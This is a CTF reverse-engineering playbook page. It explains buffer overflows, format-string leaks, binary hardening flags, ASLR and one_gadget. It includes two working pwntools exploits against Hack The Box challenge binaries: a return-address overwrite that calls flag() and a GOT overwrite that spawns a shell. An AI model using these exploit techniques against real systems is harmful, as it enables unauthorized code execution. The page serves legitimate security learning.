---
slug: /playbooks/reversing
pagination_next: null
pagination_prev: null
toc_min_heading_level: 2
toc_max_heading_level: 5
---

# Reversing

There are a series of challenges where you are given a binary file and you need to be able to obtain the flag inside. In order to do so, you need to perform Reverse engineering. In order to do so, you should use a debugger or a decompiler (or both).

The first step is to use as a regular user and pay attention to the strings appearing in the UI. Later, we can search those strings in the decompiler.

One useful tool to perform this kind of analysis is [ghidra](https://github.com/NationalSecurityAgency/ghidra).

For instance, you can search for references, memory addresses, search for strings, etc..

Another interesting tool is `gdb`, the gnu debugger. More on this to come, when i'm not familiar.

To debug Windows binaries, you can use `ollydbg`, analyse the code and place the breakpoints in the interesting addresses.

## Buffer overflow

In order to understand this attack, first we need to understand how the memory works in the computers.

We first need to understand that memory has the following regions:

| Memory section | Description                                                                                            |
|----------------|--------------------------------------------------------------------------------------------------------|
| Stack          | stores function local variables and information about function calls: return address, arguments, etc.. |
| Heap           | stores the dynamic memory. Used by malloc, etc...                                                      |
| BSS            | stores the uninitialized static/global variables                                                       |
| Data           | stores the static/global variables                                                                     |
| Text           | read only, stores the executable code                                                                  |

Inside the stack, a new stack frame is created for every function execution. Inside a stack frame, we can see:

| Stack frame section    | Description                                                           |
|------------------------|-----------------------------------------------------------------------|
| Function arguments     |                                                                       |
| Return address         | where to go when the execution ends                                   |
| Previous frame pointer | to know what is the stack frame of the function calling this function |
| Local variables        |                                                                       |


Take this functions as example:
```c
#include <string.h>
void foo(char *str)
{
  char buffer[12];
  /* The following statement will result in buffer overflow */
  strcpy(buffer, str);
}
int main()
{
  char *str = "This is definitely longer than 12";
  foo(str);
  return 1;
}
```

The stack frame for foo() will look like this:

| Stack frame section    | Value                                                                 |
|------------------------|-----------------------------------------------------------------------|
| Function arguments     | str (pointer)                                                         |
| Return address         |                                                                       |
| Previous frame pointer |                                                                       |
| Local variables        |  buffer[11]<br/><br/>...<br/>buffer[1]                                |

In this case, we can keep adding data into the buffer until we reach the memory address of the return address. 
Then, we can tell the program to jump to any function that we want.

Knowing that, buffer overflow technique consists in three stages:

### Overflow the stack pointer

When a function does not limit the input characters, it can happen that the user inputs more bytes than the expected, e.g: `gets` function:

```c
void vuln(void)

{
  char local_bc [180];
  
  gets(local_bc);
  puts(local_bc);
  return;
}
```
In this case, if the user inputs 200 chars, the program will fail with segmentation fault and the data will be injected in some unknown region of the stack.

### Reach to the return address

Knowing that the function is vulnerable to buffer overflow, we can craft a special payload that change the return address to make it jump where we want.

In order to do this, the first thing we need to do is find the offset on the input data in order to write to the return address.

Using ghidra we can find easily the value of the return function as it will be the next instruction just after the invocation to our target function, so you will need to calculate the payload using those values.

You can do it in a less manual way using `gdb-peda`:

Knowing that the buffer has 180 chars, let's suppose that will 200 chars will overflow it, let's create a pattern of 200 chars:

`pattern_create 200 bof.txt`

and input it to the program:

`r < pattern.txt`

When the program crashes, we'll see the registers:
```bash
You know who are 0xDiablos: 
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0xc9 
EBX: 0x76414158 ('XAAv')
ECX: 0xf7fa09b4 --> 0x0 
EDX: 0x1 
ESI: 0xffffcf94 --> 0xffffd165 ("/home/gal/workspace/hack-the-box/boxes/you-know-0x-diables/vuln")
EDI: 0xf7ffcb80 --> 0x0 
EBP: 0x41594141 ('AAYA')
ESP: 0xffffceb0 ("ZAAxAAyA")
EIP: 0x41417741 ('AwAA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41417741
[------------------------------------stack-------------------------------------]
0000| 0xffffceb0 ("ZAAxAAyA")
0004| 0xffffceb4 ("AAyA")
0008| 0xffffceb8 --> 0xf7fbeb00 --> 0xf7d8fcd4 ("GCC_3.0")
0012| 0xffffcebc --> 0x3e8 
0016| 0xffffcec0 --> 0xffffcee0 --> 0x1 
0020| 0xffffcec4 --> 0xf7f9f000 --> 0x229dac 
0024| 0xffffcec8 --> 0xf7ffd020 --> 0xf7ffda40 --> 0x0 
0028| 0xffffcecc --> 0xf7d96519 --> 0x8310c483 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x41417741 in ?? ()
```
The interesting one is `EIP` as it is the register that points to the next instruction. Note that if you change the payload, the value of the EIP pointer will change as well.

Now, we can use `pattern_offset` to obtain exactly the number of characters to reach to Return address:
```bash
gdb-peda$ pattern_offset 0x41417741
1094809409 found at offset: 188
```

Now we know that if we write exactly 188 chars, the next content will be written to the return address and we can make the program jump to where we want.

### Write the exploit

In the case I'm working on the exploit just need to call another function in the code. In order to so, I'll use python [`pwntools`](https://github.com/Gallopsled/pwntools) which helps a lot on these kind of things.

```python
from pwn import *

context.update(arch="i386", os="linux")

elf = ELF("./vuln")

# offset to reach right before return address's location
offset = b"A" * 188

# craft exploit: offset + flag() + padding + parameter 1 + parameter 2
exploit = offset + p32(elf.symbols['flag'], endian="little") + p32(0x90909090) + p32(0xdeadbeef, endian="little") + p32(0xc0ded00d, endian="little")

r = elf.process()
r.sendlineafter(":", exploit)
r.interactive()
```
Remember that we are jumping to flag() using RET. This means flag() will think itself have a return address. Therefore, we should pad with any 4 bytes of content before we write the 2 parameters.

## Obfuscated code

Sometimes, when trying to reverse the code, you might see strings that look very odd, e.g:

`3734203635203636203132322036352036382034382036352037342031`

This might be some string buf obfuscated somehow. So far, I found this kind of simple de-obfuscation (the plan is to keep updating this with more obfuscation techniques):

### Hex to DEC > DEC to char > decode all string in base64
```python
import binascii
import base64

def dec_to_chr(str):
    return "".join([chr(int(s)) for s in str.decode('utf-8').split(' ')])

base64text = ""
base64text += dec_to_chr(binascii.unhexlify("3734203635203636203132322036352036382034382036352037342031") + binascii.unhexlify("31392036352035312036352036382039392036352037362031303320363520353120363520363820383120363520373620313033"))
base64text +=  dec_to_chr(binascii.unhexlify("3635203631"))
print(base64.b64decode(base64text).decode())
$s='77.74.
```
In this case, this looks like the begining of a script trying to connect to an IP address.

## String format vulnerability

Some pieces of unsecure code, will print whatever the user is coding, see:

```c
__isoc99_scanf("%299s",local_148);
printf(local_148);
```

If we're a malicious user, can use that piece of code to leak memory addresses from the stack simply by using string format: `%p,%p,%p` will leak the first
three memory positions in the stack: `0x1,0x1,0x7ffff7d14a37`

More info here https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/

More possible formats: https://en.wikipedia.org/wiki/Printf_format_string

## Security flags

When a binary is generated, there are some flags that can be setup for security reasons, here are listed. To check it you can use [checksec](https://github.com/slimm609/checksec.sh):

```bash
gal@gal-Modern-14-C12M:~/workspace/gal/blog$ checksec /usr/bin/ls
[*] '/usr/bin/ls'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

- RELRO: If there's no `RELRO` protection, it means that the Global Object Table (`GOT`) is writtable. The GOT contains the memory address of the standard library methods. If you can override this, it means that when computer executes `puts`, an attack can change the table to make it execute arbitrary code.
- Stack: canary found, it means it hard to crash and gain code execution via buffer overflow.
- NX: No code execution from the stack
- PIE: executable is loaded at random address.

More info https://opensource.com/article/21/6/linux-checksec

## ASLR: Address Space Layout Randomisation

This is a technique used to avoid memory corruption attacks. In order to prevent an attacker from reliably jumping to, for example, a particular exploited function in memory, ASLR randomly arranges the address space positions of key data areas of a process, including the base of the executable and the positions of the stack, heap and libraries.

In order to check if a exploit is stable and will work even with ASLR enabled, you can enable it in gdb:
```bash
gef➤  aslr on
[+] Enabling ASLR
gef➤  start
```

## One gadget

https://github.com/david942j/one_gadget

`libc` library has some pieces of code that runs a piece of code similar to `execve('/bin/sh', NULL, NULL)` which will lead to remote code execution.

You can use the one gadget to know exactly the memory address you need to point to achive this RCE. 

```bash
gal@gal-Modern-14-C12M:~/workspace/hackthebox/spooky-time/challenge$ one_gadget glibc/libc.so.6 
0x50a37 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
  rbp == NULL || (u16)[rbp] == NULL

0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xebcf5 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0xebcf8 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```

For every memory address, it also describe which value the register need to have in order to execute the RCE.

## Overwrite Global Object Table

The global object table is used to dynamically resolve standard library functions (`scanf`, `printf`, etc...). If you can modify it, you can alias an arbitrary code as any standard library function. You can use this flaw plus the one gadge tool in the previous section to setup a Remote Code Execution.

Below, you can find an example of how we can override the global object table using the one gadget tool:

```python
from pwn import *

context.binary = elf = ELF('./spooky_time')
libc = context.binary.libc

r = process('./spooky_time')

r.sendlineafter(b'scary!\n\n', '%3$lx%51$lx')
r.recvuntil(b'than \n')
libc.address = int(r.recvn(12), 16) - 1133111
elf.address = int(r.recvn(12), 16) - 5056
libc_one_gadget = libc.address + 0xebcf5 # libc.address + offset computed with one gadget tool

fmtstr_payload = fmtstr_payload(8, {elf.got['puts'] : libc_one_gadget}) # we make the function puts point to a RCE

r.sendlineafter(b'time..\n\n', fmtstr_payload)

r.interactive()
```